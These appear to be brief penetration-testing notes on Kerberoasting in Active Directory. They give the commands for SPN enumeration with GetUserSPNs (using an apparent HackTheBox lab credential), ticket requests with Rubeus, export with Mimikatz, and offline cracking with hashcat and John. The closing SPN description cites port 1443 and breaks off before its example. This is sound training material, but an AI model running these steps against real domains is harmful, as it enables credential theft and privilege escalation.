# A.D. Methodology

1. [GetUserSPNs.ps1](https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1) or [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)

   `python3 GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100`

2. [Get Service Tickets](https://github.com/GhostPack/Rubeus)

   `PS> .\Rubeus.exe kerberoast /simple /outfile:hashes.txt`

3. Extract Tickets

   [Mimikatz](https://github.com/gentilkiwi/mimikatz) `kerberos::list /export`

4. [Crack Tickets](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)

   HashCat: `hashcat -m 13100 --force <TGSs_file> <passwords_file>`
   
   JohnTheRipper: `john --format=krb5tgs --wordlist=<passwords_file> <ticket_file>`

## Resources
[HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)

Forge Service Tickets (TGS) with Kerberoasting [MITRE ATT&CK ID: T1558.003](https://attack.mitre.org/techniques/T1558/003/)

[Kerberoasting 101](https://www.crowdstrike.com/cybersecurity-101/kerberoasting/)

[GhostPack tools](https://github.com/GhostPack)

### Service Principal Names (SPNs)
The structure of an SPN consists of three (3) main parts: Service Class: the service type, i.e., SQL, Web, Exchange, File, etc., and the Host where the service is usually running in the format of FQDN (Fully Qualified Domain Name)and port number. For example, below, the Microsoft SQL service runs on the dcorp-mgmt host on port 1443.
